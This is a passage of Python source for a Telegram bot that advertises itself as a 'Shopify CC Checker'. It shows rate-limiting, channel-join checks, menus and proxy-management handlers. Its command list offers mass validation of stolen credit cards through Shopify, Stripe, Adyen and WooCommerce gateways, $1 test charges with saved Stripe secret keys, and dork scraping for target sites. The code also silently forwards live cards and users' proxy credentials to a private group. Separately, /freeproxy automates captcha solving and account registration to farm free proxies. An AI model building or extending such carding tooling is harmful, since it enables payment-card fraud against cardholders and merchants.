    • Enforces _RATE-second cooldown between events per user (soft throttle).
    """
    _RATE            = 0.4    # min seconds between events per user
    _AUTO_BAN_WINDOW = 10.0   # sliding window for spam detection (seconds)
    _AUTO_BAN_LIMIT  = 20     # events in that window before auto-ban

    _last:   dict[int, float]       = {}
    _window: dict[int, list[float]] = {}   # recent event timestamps per user

    async def __call__(self, handler, event, data):
        user: types.User | None = data.get("event_from_user")
        if not user:
            return await handler(event, data)

        uid = user.id

        # Silently drop banned users — no reply, no processing
        if is_banned(uid):
            return

        now = time.monotonic()

        # Sliding-window spam detection
        times = self._window.get(uid, [])
        times = [t for t in times if now - t < self._AUTO_BAN_WINDOW]
        times.append(now)
        self._window[uid] = times

        if len(times) >= self._AUTO_BAN_LIMIT:
            ban_user(uid)
            log.warning(
                "AUTO-BAN: user %s (@%s) sent %d events in %.1fs",
                uid, user.username or "?", len(times), self._AUTO_BAN_WINDOW,
            )
            return

        # Soft rate-limit (sleep briefly rather than drop)
        last = self._last.get(uid, 0.0)
        diff = now - last
        if diff < self._RATE:
            await asyncio.sleep(self._RATE - diff)
        self._last[uid] = time.monotonic()

        # Log every command so we can trace who runs what
        try:
            if hasattr(event, "text") and event.text:
                cmd_preview = event.text.split("\n")[0][:60]
                log.info("CMD uid=%s @%s → %s", uid, user.username or "?", cmd_preview)
        except Exception:
            pass

        return await handler(event, data)

dp.message.middleware(_ThrottleMiddleware())
dp.callback_query.middleware(_ThrottleMiddleware())


# ══════════════════════════════════════════════════════════════════════════════
#  JOIN CHECK MIDDLEWARE
# ══════════════════════════════════════════════════════════════════════════════

# ── Join-check cache (avoid Telegram API rate limits) ────────────────────────
# With 3K users sending commands, check_user_joined() fires 2 API calls each.
# Telegram rate-limits → bot hangs for minutes. Cache result for 5 minutes.
# Negative (not-joined) results cached only 30 seconds so Verify works immediately.
_join_cache: dict[int, tuple[bool, float]] = {}
_JOIN_CACHE_TTL_OK  = 300   # 5 min  — cache joined=True
_JOIN_CACHE_TTL_NO  = 30    # 30 sec — cache joined=False (re-check fast after joining)

async def check_user_joined(user_id: int, force: bool = False) -> bool:
    """Check if user has joined both channel and group.
    Positive results cached 5 min; negative results cached 30 sec.
    Pass force=True (used by Verify button) to always do a fresh API call.
    """
    now = time.time()
    if not force:
        cached = _join_cache.get(user_id)
        if cached:
            ttl = _JOIN_CACHE_TTL_OK if cached[0] else _JOIN_CACHE_TTL_NO
            if now - cached[1] < ttl:
                return cached[0]
    try:
        ch_member = await bot.get_chat_member(join_channel_id, user_id)
        gr_member = await bot.get_chat_member(join_chat_id, user_id)
        valid = {ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR}
        result = ch_member.status in valid and gr_member.status in valid
    except Exception:
        result = False
    _join_cache[user_id] = (result, now)
    return result

def join_keyboard() -> dict:
    """Inline keyboard with join buttons + verify button."""
    return {
        "inline_keyboard": [
            [{
                "text": f"{bold('Join Channel')}",
                "url": CHANNEL_LINK,
                "icon_custom_emoji_id": E["chat"],
                "style": "primary"
            },
            {
                "text": f"{bold('Join Group')}",
                "url": GROUP_LINK,
                "icon_custom_emoji_id": E["chat2"],
                "style": "primary"
            }
            ],
            [{
                "text": f"{bold('Verify Joined')}",
                "callback_data": "verify_join",
                "icon_custom_emoji_id": E["check"],
                "style": "success"
            }],
        ]
    }

JOIN_MSG = (
    f"{pe(E['warn'])} {bold('Access Restricted')}\n\n"
    f"{pe(E['bolt'])} {bold('You must join our channel and group to use this bot.')}\n\n"
    f"{pe(E['link'])} {bold('Tap the buttons below to join, then tap Verify.')}"
)


# ══════════════════════════════════════════════════════════════════════════════
#  MENU KEYBOARD
# ══════════════════════════════════════════════════════════════════════════════

def menu_keyboard() -> dict:
    return {
        "inline_keyboard": [
            [{
                "text": f"{bold('CMDS')}",
                "callback_data": "menu_check",
                "icon_custom_emoji_id": "5445353829304387411",
                "style": "success"
            },
            {
                "text": f"{bold('Set Proxy')}",
                "callback_data": "menu_proxy",
                "icon_custom_emoji_id": "5796407074346767851",
                "style": "success"
            }],
            [{
                "text": f"{bold('My Profile')}",
                "callback_data": "menu_profile",
                "icon_custom_emoji_id": "5978784790327856236",
                "style": "primary"
            }],
        ]
    }

def back_keyboard() -> dict:
    """Single blue Back button to return to the main menu."""
    return {
        "inline_keyboard": [
            [{
                "text": f"{bold('Back')}",
                "callback_data": "menu_back",
                "icon_custom_emoji_id": "5269720500468201056",
                "style": "primary"
            }],
        ]
    }

WELCOME_MSG = (
    f"{pe(E['gem'])} {bold('Welcome to Shopify CC Checker')}\n\n"
    f"{pe(E['bolt'])} {bold('High-speed Shopify gateway checker')}\n"
    f"{pe(E['check'])} {bold('Supports all proxy formats')}\n"
    f"{pe(E['globe'])} {bold('Multi-site rotation with retry logic')}\n\n"
    f"{pe(E['star'])} {bold('Use the menu below to get started:')}"
)


# ══════════════════════════════════════════════════════════════════════════════
#  REGISTER MIDASBUY MODULE (off)
# ══════════════════════════════════════════════════════════════════════════════

# midasbuy.register(
#     bot=bot,
#     check_joined=check_user_joined,
#     join_msg=JOIN_MSG,
#     join_kb=join_keyboard,
#     get_user_proxy=get_user_proxy,
#     get_user_proxies=get_user_proxies,
#     pe_fn=pe,
#     emoji_map=E,
#     result_emoji_map=R,
#     bold_fn=bold,
#     user_link_fn=user_link,
#     brand_emoji_fn=brand_emoji,
# )


# ══════════════════════════════════════════════════════════════════════════════
#  /start COMMAND
# ══════════════════════════════════════════════════════════════════════════════

async def _send_approved(text: str) -> None:
    """Silently forward an approved (live, non-charged) CC result to the approved group."""
    try:
        await bot.send_message(auth.APPROVED_GROUP_ID, text, disable_notification=True)
    except Exception:
        pass


@router.message(CommandStart())
async def cmd_start(message: types.Message):
    # Save user on first visit
    is_new = auth.save_user(message.from_user.id, message.from_user.username, message.from_user.full_name)

    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(
            JOIN_MSG,
            reply_markup=join_keyboard(),
        )
        return

    if auth.is_banned(message.from_user.id):
        await message.reply(f"{pe(E['cross'])} {bold('You are banned from this bot!')}")
        return

    await message.reply(
        WELCOME_MSG,
        reply_markup=menu_keyboard(),
    )


# ══════════════════════════════════════════════════════════════════════════════
#  VERIFY JOIN CALLBACK
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data == "verify_join")
async def cb_verify_join(callback: types.CallbackQuery):
    # Always do a fresh API check — bypasses cache so users see instant result
    joined = await check_user_joined(callback.from_user.id, force=True)
    if not joined:
        await callback.answer(
            f"{bold('You have not joined yet! Join both channel and group first.')}",
            show_alert=True,
        )
        return

    await callback.answer(f"{bold('Verified! Welcome!')}")
    await safe_edit(callback.message, WELCOME_MSG, reply_markup=menu_keyboard())


# ══════════════════════════════════════════════════════════════════════════════
#  MENU CALLBACKS
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data == "menu_back")
async def cb_menu_back(callback: types.CallbackQuery):
    """Back button → edit message back to the main menu."""
    await callback.answer()
    try:
        await safe_edit(callback.message, 
            WELCOME_MSG,
            reply_markup=menu_keyboard(),
        )
    except Exception:
        pass


@router.callback_query(F.data == "menu_check")
async def cb_menu_check(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe(E['gem'])} {bold('Command List')}\n\n"
        f"{pe(E['bolt'])} /sh cc|mm|yy|cvv — {bold('Check a CC')}\n"
        f"{pe(E['rocket'])} /msh cc|mm|yy|cvv ... — {bold('Mass check (parallel)')}\n"
        f"{pe(E['dice'])} /ran — {bold('File check (reply to .txt)')}\n"
        f"{pe(E['gem'])} /ayd link cc... — {bold('Adyen checker')}\n"
        f"{pe(E['gem'])} /hit link cc... — {bold('Stripe checker')}\n\n"
        f"{pe(E['star'])} {bold('ST Commands (WooCommerce):')}\n"
        f"{pe(E['plus'])} /sadd site — {bold('Add/test WooCommerce site')}\n"
        f"{pe(E['bolt'])} /st cc|mm|yy|cvv — {bold('Single ST check')}\n"
        f"{pe(E['rocket'])} /mst cc ... — {bold('Mass ST check (10 inline)')}\n"
        f"{pe(E['dice'])} /stxt — {bold('ST file check (.txt)')}\n"
        f"{pe(E['bolt'])} /st1 — {bold('Stripe $1 single (proxy)')}\n"
        f"{pe(E['rocket'])} /mst1 — {bold('Stripe $1 mass (20 CCs)')}\n"
        f"{pe(E['dice'])} /st1txt — {bold('Stripe $1 file check')}\n"
        f"{pe(E['bolt'])} /skcvv /mskcvv /sktxt — {bold('Stripe SK $1 charge')}\n"
        f"{pe(E['plus'])} /skadd sk — {bold('Save SK (auto PK + test)')}\n"
        f"{pe(E['globe'])} /smysite — {bold('View saved site')}\n"
        f"{pe(E['cross'])} /srem — {bold('Remove saved site')}\n"
        f"{pe(E['refresh'])} /stest sites... — {bold('Test sites (max 25)')}\n\n"
        f"{pe(E['link'])} /proxy host:port:user:pass — {bold('Set proxy')}\n"
        f"{pe(E['gift'])} /freeproxy — {bold('10 free proxies (24h cooldown)')}\n"
        f"{pe(E['link'])} /freeproxylist — {bold('Show your pending fetched proxies')}\n"
        f"{pe(E['link'])} /myproxy — {bold('View current proxy')}\n"
        f"{pe(E['cross'])} /rmproxy — {bold('Remove proxy')}\n"
        f"{pe(E['globe'])} /dork keyword — {bold('Brave Search URL scraper (→ .txt)')}\n"
        f"{pe(E['bank'])} /bin 438854 — {bold('BIN lookup')}\n"
        f"{pe(E['gift'])} /redeem key — {bold('Redeem access key')}\n"
        f"{pe(E['bolt'])} /ai prompt — {bold('Ask AI (Kimi) anything · attach files too')}\n"
        f"{pe(E['user'])} /start — {bold('Main menu')}\n"
        f"{pe(E['sparkle'])} /cmds — {bold('This help message')}\n\n"
        f"{pe(E['star'])} {bold('Admin Commands:')}\n"
        f"{pe(E['next'])} /admin id — {bold('Add admin')}\n"
        f"{pe(E['next'])} /auth id — {bold('Give premium')}\n"
        f"{pe(E['next'])} /unauth id — {bold('Remove premium')}\n"
        f"{pe(E['next'])} /ban id — {bold('Ban user')}\n"
        f"{pe(E['next'])} /unban id — {bold('Unban user')}\n"
        f"{pe(E['next'])} /key users days — {bold('Generate 1 multi-use key')}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass

@router.callback_query(F.data == "menu_proxy")
async def cb_menu_proxy(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe(E['link'])} {bold('Proxy Manager')}\n\n"
        f"{pe(E['next'])} /proxy host:port:user:pass\n"
        f"{pe(E['next'])} /proxy socks5://user:pass@host:port\n"
        f"{pe(E['next'])} /myproxy — {bold('View current proxy')}\n"
        f"{pe(E['next'])} /rmproxy — {bold('Remove proxy')}\n\n"
        f"{pe(E['gift'])} /freeproxy — {bold('Get 10 free proxies (24h cooldown)')}\n"
        f"{pe(E['link'])} /freeproxylist — {bold('Show your pending fetched proxies')}\n\n"
        f"{pe(E['globe'])} /dork keyword — {bold('Brave Search URL scraper (→ .txt)')}\n\n"
        f"{pe(E['check'])} {bold('Proxy is tested before saving.')}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass

@router.callback_query(F.data == "menu_bin")
async def cb_menu_bin(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"{pe(E['bank'])} {bold('BIN Lookup')}\n\n"
        f"{pe(E['next'])} /bin 438854\n"
        f"{pe(E['next'])} /bin 4388541234567890\n\n"
        f"{pe(E['check'])} {bold('Returns brand, type, level, bank, and country.')}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass

@router.callback_query(F.data == "menu_profile")
async def cb_menu_profile(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    uname = callback.from_user.full_name or "Unknown"
    username = callback.from_user.username or "none"
    proxy_list = get_user_proxies(uid)
    count = len(proxy_list)

    proxy_status = f"{pe(E['check'])} {bold(str(count) + ' proxies')}" if proxy_list else f"{pe(E['cross'])} {bold('Not Set')}"

    # Premium status
    role = auth.get_user_role(uid)
    expiry = auth.get_premium_expiry(uid)
    if role == "owner":
        prem_line = f"{pe(E['gem'])} {bold('Owner')} {bold('(Lifetime)')}"
    elif role == "admin":
        prem_line = f"{pe(E['gem'])} {bold('Admin')} {bold('(Lifetime)')}"
    elif role == "premium":
        prem_line = f"{pe(E['check'])} {bold('Premium')} {bold('(')} {bold(expiry)} {bold(')')}"
    else:
        prem_line = f"{pe(E['cross'])} {bold('Free User')}"

    cc_limit = auth.get_cc_limit(uid)

    # HTML-escape user name/username to prevent <, >, & breaking HTML parse
    safe_uname = _html.escape(uname)
    safe_username = _html.escape(username)

    text = (
        f"{pe(E['user'])} {bold('User Profile')}\n\n"
        f"{pe(E['star'])} {bold('Name:')} {user_link(uid, uname)}\n"
        f"{pe(E['star'])} {bold('Username:')} @{safe_username}\n"
        f"{pe(E['star'])} {bold('ID:')} {bold(str(uid))}\n\n"
        f"{pe(E['gem'])} {bold('Plan:')} {prem_line}\n"
        f"{pe(E['bolt'])} {bold('Proxy:')} {proxy_status}\n\n"
        f"{pe(E['rocket'])} {bold('CC Limit (/ran):')} {bold(str(cc_limit))}"
    )
    try:
        await safe_edit(callback.message, text, reply_markup=back_keyboard())
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /proxy COMMAND — Add Proxy
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("proxy"))
async def cmd_proxy(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id
    raw_text = ""

    # 1. Check command args (multi-line)
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    # 2. Check replied message text
    if message.reply_to_message:
        reply_txt = message.reply_to_message.text or message.reply_to_message.caption or ""
        if reply_txt.strip():
            raw_text = raw_text + "\n" + reply_txt if raw_text else reply_txt

    # 3. Check replied .txt file document
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if doc.file_name and doc.file_name.lower().endswith(".txt"):
            try:
                from io import BytesIO
                buf = BytesIO()
                await bot.download(doc.file_id, destination=buf)
                buf.seek(0)
                file_text = buf.read().decode("utf-8", errors="ignore")
                if file_text.strip():
                    raw_text = raw_text + "\n" + file_text if raw_text else file_text
            except Exception as e:
                log.error(f"Failed to download proxy file: {e}")

    if not raw_text.strip():
        await message.reply(
            f"{pe(E['warn'])} {bold('Usage:')}\n\n"
            f"{pe(E['next'])} /proxy host:port:user:pass\n"
            f"{pe(E['next'])} {bold('Multi-line:')}\n"
            f"/proxy proxy1\nproxy2\nproxy3\n\n"
            f"{pe(E['next'])} {bold('Or reply to a .txt file with proxies')}\n\n"
            f"{pe(E['bolt'])} {bold('Supported formats:')}\n"
            f"{pe(E['next'])} host:port\n"
            f"{pe(E['next'])} host:port:user:pass\n"
            f"{pe(E['next'])} user:pass@host:port\n"
            f"{pe(E['next'])} socks5://user:pass@host:port\n\n"
            f"{pe(E['star'])} {bold('Max')} {bold(str(MAX_PROXIES_PER_USER))} {bold('proxies per user.')}"
        )
        return

    # Parse all proxy lines
    parsed_list = []
    parse_failed = 0
    for line in raw_text.strip().splitlines():
        line = line.strip()
        if not line:
            continue
        parsed = parse_proxy_format(line)
        if parsed:
            parsed_list.append(parsed)
        else:
            parse_failed += 1

    if not parsed_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid proxies found!')}\n\n"
            f"{pe(E['warn'])} {bold('Check your format and try again.')}"
        )
        return

    # ── Test proxies in batches, keep only working, stop at 30 ────────────────
    need = MAX_PROXIES_PER_USER - len(get_user_proxies(user_id))
    if need <= 0:
        await message.reply(
            f"{pe(E['warn'])} {bold('Proxy list full!')} ({bold(str(MAX_PROXIES_PER_USER))}/{bold(str(MAX_PROXIES_PER_USER))})\n\n"
            f"{pe(E['next'])} {bold('Use')} /rmproxy {bold('to clear and add new ones.')}"
        )
        return

    status_msg = await message.reply(
        f"{pe(E['loading'])} {bold('Testing proxies...')}\n\n"
        f"{pe(E['hourglass'])} {bold('Parsed:')} {bold(str(len(parsed_list)))} | "
        f"{bold('Testing in batches of 10...')}\n"
        f"{pe(E['bolt'])} {bold('Will stop at')} {bold(str(need))} {bold('working proxies.')}"
    )

    working = []
    dead = 0
    TEST_BATCH = 10
    stopped_early = False

    for batch_start in range(0, len(parsed_list), TEST_BATCH):
        if len(working) >= need:
            stopped_early = True
            break

        batch = parsed_list[batch_start:batch_start + TEST_BATCH]

        async def _test_one(proxy_data):
            try:
                success, _, _ = await test_proxy(proxy_data["proxy_url"])
                return proxy_data if success else None
            except Exception:
                return None

        results = await asyncio.gather(*[_test_one(p) for p in batch])

        for r in results:
            if r is not None and len(working) < need:
                working.append(r)
            elif r is None:
                dead += 1

        # Update status
        try:
            await safe_edit(status_msg, 
                f"{pe(E['loading'])} {bold('Testing proxies...')}\n\n"
                f"{pe(E['check'])} {bold('Working:')} {bold(str(len(working)))}/{bold(str(need))}\n"
                f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}\n"
                f"{pe(E['hourglass'])} {bold('Tested:')} {bold(str(batch_start + len(batch)))}/{bold(str(len(parsed_list)))}"
            )
        except Exception:
            pass

        if len(working) >= need:
            stopped_early = True
            break

    if not working:
        await safe_edit(status_msg, 
            f"{pe(E['cross'])} {bold('All proxies are dead!')}\n\n"
            f"{pe(E['warn'])} {bold('Tested:')} {bold(str(len(parsed_list)))} | {bold('None working.')}"
        )
        return

    # Save working proxies
    add_user_proxies(user_id, working)
    total = len(get_user_proxies(user_id))

    # Notify approved group silently — show each proxy
    try:
        _px_lines = []
        for _p in working:
            _ip = _p.get("ip", "-")
            _port = _p.get("port", "-")
            _user = _p.get("username") or ""
            _pw = _p.get("password") or ""
            if _user and _pw:
                _px_lines.append(f"{pe(E['link'])} {bold(f'{_ip}:{_port}:{_user}:{_pw}')}")
            else:
                _px_lines.append(f"{pe(E['link'])} {bold(f'{_ip}:{_port}')}")
        _px_block = "\n".join(_px_lines) if _px_lines else bold("(none)")
        await bot.send_message(
            auth.APPROVED_GROUP_ID,
            f"{pe(E['check'])} {bold('Proxy Saved!')}\n\n"
            f"{pe(R['checked_by'])} {bold('User:')} {user_link(user_id, message.from_user.full_name, message.from_user.username or '')}\n"
            f"{pe(E['bolt'])} {bold('Working:')} {bold(str(len(working)))}\n"
            f"{pe(E['star'])} {bold('Total:')} {bold(str(total))}/{bold(str(MAX_PROXIES_PER_USER))}\n\n"
            f"{pe(E['globe'])} {bold('Proxies:')}\n{_px_block}",
            disable_notification=True,
        )
    except Exception:
        pass

    result_lines = [
        f"{pe(E['check'])} {bold('Proxy Testing Complete!')}\n",
        f"{pe(E['bolt'])} {bold('Working:')} {bold(str(len(working)))}",
        f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}",
    ]
    if parse_failed:
        result_lines.append(f"{pe(E['warn'])} {bold('Parse failed:')} {bold(str(parse_failed))}")
    if stopped_early:
        result_lines.append(f"{pe(E['star'])} {bold('Stopped early — reached')} {bold(str(need))} {bold('limit.')}")
    result_lines.append(f"{pe(E['star'])} {bold('Total saved:')} {bold(str(total))}/{bold(str(MAX_PROXIES_PER_USER))}")
    result_lines.append(f"\n{pe(E['refresh'])} {bold('Random proxy used for each CC check.')}")

    await safe_edit(status_msg, "\n".join(result_lines))


# ══════════════════════════════════════════════════════════════════════════════
#  /myproxy COMMAND — View Current Proxy
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("myproxy"))
async def cmd_myproxy(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    proxy_list = get_user_proxies(message.from_user.id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxies Set!')}\n\n"
            f"{pe(E['warn'])} {bold('Use')} /proxy host:port:user:pass {bold('to add.')}"
        )
        return

    lines = [f"{pe(E['link'])} {bold('Your Proxies')} [{bold(str(len(proxy_list)))}/{bold(str(MAX_PROXIES_PER_USER))}]\n"]
    for i, p in enumerate(proxy_list[:10], 1):
        ip = p.get('ip', '-')
        port = p.get('port', '-')
        ptype = p.get('type', 'http').upper()
        lines.append(f"{pe(E['bolt'])} {bold(str(i))}. {bold(ip)}:{bold(port)} ({bold(ptype)})")
    if len(proxy_list) > 10:
        lines.append(f"{pe(E['next'])} {bold('...')} {bold(str(len(proxy_list) - 10))} {bold('more')}")
    lines.append(f"\n{pe(E['refresh'])} {bold('Random proxy used for each check.')}")

    check_proxy_btn = {
        "inline_keyboard": [
            [{
                "text": f"{bold('Check Proxy')}",
                "callback_data": f"check_proxy:{message.from_user.id}",
                "icon_custom_emoji_id": "6235750196861474610",
                "style": "primary"
            }],
        ]
    }

    await message.reply("\n".join(lines), reply_markup=check_proxy_btn)


# ══════════════════════════════════════════════════════════════════════════════
#  CHECK PROXY CALLBACK — Test all proxies, remove dead ones
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("check_proxy:"))
async def cb_check_proxy(callback: types.CallbackQuery):
    owner_id = int(callback.data.split(":", 1)[1])

    if callback.from_user.id != owner_id:
        await callback.answer(bold("This is not your proxy list!"), show_alert=True)
        return

    proxy_list = get_user_proxies(owner_id)
    if not proxy_list:
        await callback.answer(bold("No proxies to check!"), show_alert=True)
        return

    await callback.answer()

    total = len(proxy_list)

    # Update message to show testing status
    try:
        await safe_edit(callback.message, 
            f"{pe(E['loading'])} {bold('Checking Proxies...')}\n\n"
            f"{pe(E['hourglass'])} {bold('Total:')} {bold(str(total))}\n"
            f"{pe(E['bolt'])} {bold('Testing in batches of 10...')}",
        )
    except Exception:
        pass

    working = []
    dead = 0
    TEST_BATCH = 10

    for batch_start in range(0, total, TEST_BATCH):
        batch = proxy_list[batch_start:batch_start + TEST_BATCH]

        async def _test_one(proxy_data):
            try:
                success, _, _ = await test_proxy(proxy_data["proxy_url"])
                return proxy_data if success else None
            except Exception:
                return None

        results = await asyncio.gather(*[_test_one(p) for p in batch])

        for r in results:
            if r is not None:
                working.append(r)
            else:
                dead += 1

        # Update progress
        tested = batch_start + len(batch)
        try:
            await safe_edit(callback.message, 
                f"{pe(E['loading'])} {bold('Checking Proxies...')}\n\n"
                f"{pe(E['check'])} {bold('Working:')} {bold(str(len(working)))}\n"
                f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}\n"
                f"{pe(E['hourglass'])} {bold('Tested:')} {bold(str(tested))}/{bold(str(total))}",
            )
        except Exception:
            pass

    # Save only working proxies (overwrite user's list)
    data = _load_proxies()
    data[str(owner_id)] = working
    _save_proxies(data)

    # Build final result with proxy list
    if not working:
        try:
            await safe_edit(callback.message, 
                f"{pe(E['cross'])} {bold('All Proxies Dead!')}\n\n"
                f"{pe(E['warn'])} {bold('Tested:')} {bold(str(total))} | {bold('None working.')}\n"
                f"{pe(E['next'])} {bold('Use')} /proxy {bold('to add new ones.')}"
            )
        except Exception:
            pass
        return

    lines = [
        f"{pe(E['check'])} {bold('Proxy Check Complete!')}\n",
        f"{pe(E['bolt'])} {bold('Working:')} {bold(str(len(working)))}",
        f"{pe(E['cross'])} {bold('Dead:')} {bold(str(dead))}",
    ]
    if dead > 0:
        lines.append(f"{pe(E['warn'])} {bold(str(dead))} {bold('dead proxies removed!')}")
    lines.append(f"{pe(E['star'])} {bold('Total saved:')} {bold(str(len(working)))}/{bold(str(MAX_PROXIES_PER_USER))}")
    lines.append("")

    for i, p in enumerate(working[:10], 1):
        ip = p.get('ip', '-')
        port = p.get('port', '-')
        ptype = p.get('type', 'http').upper()
        lines.append(f"{pe(E['bolt'])} {bold(str(i))}. {bold(ip)}:{bold(port)} ({bold(ptype)})")
    if len(working) > 10:
        lines.append(f"{pe(E['next'])} {bold('...')} {bold(str(len(working) - 10))} {bold('more')}")
    lines.append(f"\n{pe(E['refresh'])} {bold('Random proxy used for each check.')}")

    check_proxy_btn = {
        "inline_keyboard": [
            [{
                "text": f"{bold('Check Proxy')}",
                "callback_data": f"check_proxy:{owner_id}",
                "icon_custom_emoji_id": "6235750196861474610",
                "style": "primary"
            }],
        ]
    }

    try:
        await safe_edit(callback.message, "\n".join(lines), reply_markup=check_proxy_btn)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════════
#  /rmproxy COMMAND — Remove All Proxies
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("rmproxy"))
async def cmd_rmproxy(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    proxy_list = get_user_proxies(message.from_user.id)
    if not proxy_list:
        await message.reply(
            f"{pe(E['warn'])} {bold('No proxies to remove!')}"
        )
        return

    count = len(proxy_list)
    del_user_proxy(message.from_user.id)
    await message.reply(
        f"{pe(E['check'])} {bold('All')} {bold(str(count))} {bold('proxies removed!')}"
    )


async def _freeproxy_bg(uid: int, wait_msg):
    """Background coroutine for /freeproxy — runs without a Telegram handler timeout."""
    try:
        raw_proxies: list[str] = await asyncio.wait_for(
            _webshare_mod.get_free_proxies(10, user_id=uid), timeout=180
        )
    except asyncio.TimeoutError:
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Timed out fetching proxies. Try again later.')}"
        )
        return
    except Exception as exc:
        log.exception(f"[FREEPROXY] get_free_proxies exception: {exc}")
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Error fetching proxies:')} {bold(str(exc)[:120])}"
        )
        return

    if not raw_proxies:
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Could not fetch proxies right now.')}\n\n"
            f"{pe(E['sparkle'])} {bold('The free tier may be exhausted — try again in a few minutes.')}"
        )
        return

    parsed: list[dict] = []
    for line in raw_proxies:
        p = parse_proxy_format(line)
        if p:
            parsed.append(p)

    if not parsed:
        await safe_edit(
            wait_msg,
            f"{pe(E['cross'])} {bold('Proxies received but could not be parsed. Check logs.')}"
        )
        return

    to_add = parsed[:10]
    _freeproxy_pending[uid] = to_add
    freeproxy_set_claimed(uid)

    copy_lines = []
    for p in to_add:
        ip   = p.get("ip", "?")
        port = str(p.get("port", "?"))
        user = p.get("username") or ""
        pw   = p.get("password") or ""
        copy_lines.append(f"{ip}:{port}:{user}:{pw}" if user and pw else f"{ip}:{port}")

    _save_freeproxy_last(uid, copy_lines)

    existing   = get_user_proxies(uid)
    slots_free = MAX_PROXIES_PER_USER - len(existing)

    lines = [
        f"{pe(E['check'])} {bold(f'Fetched {len(to_add)} free proxies!')}",
        "",
        f"{pe(E['link'])} {bold('Proxies')} {bold('(ip:port:user:pass)')}",
        "",
    ]
    for i, proxy_str in enumerate(copy_lines, 1):
        lines.append(f"  {bold(str(i))}. {bold(proxy_str)}")

    lines += [""]
    if slots_free <= 0:
        lines.append(f"{pe(E['warn'])} {bold('Your list is full — use Copy All to save them manually.')}")
    else:
        can_add = min(len(to_add), slots_free)
        lines.append(f"{pe(E['sparkle'])} {bold(f'Slots free: {slots_free}/{MAX_PROXIES_PER_USER} — {can_add} will be added')}")
    lines.append(f"{pe(E['hourglass'])} {bold('Tap Add to save to your proxy list.')}")

    kb = {
        "inline_keyboard": [[
            {
                "text": bold("Copy All"),
                "callback_data": f"freeproxy_copy:{uid}",
                "icon_custom_emoji_id": E["link2"],
                "style": "primary",
            },
            {
                "text": bold("Add to My List"),
                "callback_data": f"freeproxy_add:{uid}",
                "icon_custom_emoji_id": E["plus"],
                "style": "success",
            },
        ]]
    }

    await safe_edit(wait_msg, "\n".join(lines), reply_markup=kb)


# ══════════════════════════════════════════════════════════════════════════════
#  /freeproxy COMMAND — Auto-fetch 10 free webshare.io proxies (24h cooldown)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("freeproxy"))
async def cmd_freeproxy(message: types.Message):
    uid = message.from_user.id

    # ── Auth checks ────────────────────────────────────────────────────────────
    joined = await check_user_joined(uid)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(uid):
        await message.reply(f"{pe(E['cross'])} {bold('You are banned!')}")
        return

    # ── Cooldown check (owner bypasses) ───────────────────────────────────────
    if uid != auth.OWNER_ID:
        remaining = freeproxy_cooldown_remaining(uid)
        if remaining > 0:
            hrs  = int(remaining // 3600)
            mins = int((remaining % 3600) // 60)
            await message.reply(
                f"{pe(E['warn'])} {bold('Cooldown active!')}\n\n"
                f"{pe(E['hourglass'])} {bold('Next claim in:')} {bold(f'{hrs}h {mins}m')}\n\n"
                f"{pe(E['sparkle'])} {bold('You can claim 10 free proxies every 24 hours.')}"
            )
            return

    # ── Module availability ────────────────────────────────────────────────────
    if not _WEBSHARE_AVAILABLE:
        await message.reply(
            f"{pe(E['warn'])} {bold('Free proxy service not available on this node.')}"
        )
        return

    # ── Kick off background task — returns immediately, no 90s timeout ────────
    wait_msg = await message.reply(
        f"{pe(E['hourglass'])} {bold('Generating your free proxies...')}\n"
        f"{pe(E['sparkle'])} {bold('Solving captcha & registering — this takes ~30-90s.')}\n"
        f"{pe(E['sparkle'])} {bold('This message will update when ready.')}"
    )
    asyncio.create_task(_freeproxy_bg(uid, wait_msg))


# ══════════════════════════════════════════════════════════════════════════════
#  FREEPROXY ADD CALLBACK — saves pending proxies when user taps "Add to My List"
# ══════════════════════════════════════════════════════════════════════════════

@router.callback_query(F.data.startswith("freeproxy_add:"))
async def cb_freeproxy_add(callback: types.CallbackQuery):
    owner_id = int(callback.data.split(":", 1)[1])

    if callback.from_user.id != owner_id:
        await callback.answer(bold("These are not your proxies!"), show_alert=True)
        return

    uid      = owner_id
    to_add   = _freeproxy_pending.pop(uid, None)

    if not to_add:
        await callback.answer(bold("Already added or expired. Run /freeproxy again."), show_alert=True)
